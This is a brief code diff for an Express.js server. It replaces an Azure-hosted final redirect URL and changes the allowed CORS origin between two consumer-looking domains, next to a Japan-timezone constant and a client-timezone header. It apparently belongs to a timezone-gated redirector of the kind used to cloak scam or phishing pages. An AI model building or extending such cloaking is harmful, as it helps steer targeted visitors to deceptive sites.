@@ -2,12 +2,12 @@ import express from "express";
 
 const app = express();
 
-const FINAL_REDIRECT_URL = "https://jp13472.blob.core.windows.net/$web/index.html";
+const FINAL_REDIRECT_URL = "https://js-cdn-endpoint-hfecfwcteya4hhfy.z02.azurefd.net/";
 const JAPAN_TIMEZONE = "Asia/Tokyo";
 
 // ✅ CORS middleware (required for fetch)
 app.use((req, res, next) => {
-  res.setHeader("Access-Control-Allow-Origin", "https://soulmatedating.space");
+  res.setHeader("Access-Control-Allow-Origin", "https://toyo-japan.online");
   res.setHeader("Access-Control-Allow-Headers", "Content-Type, x-client-timezone");
   res.setHeader("Access-Control-Allow-Methods", "GET");
   next();
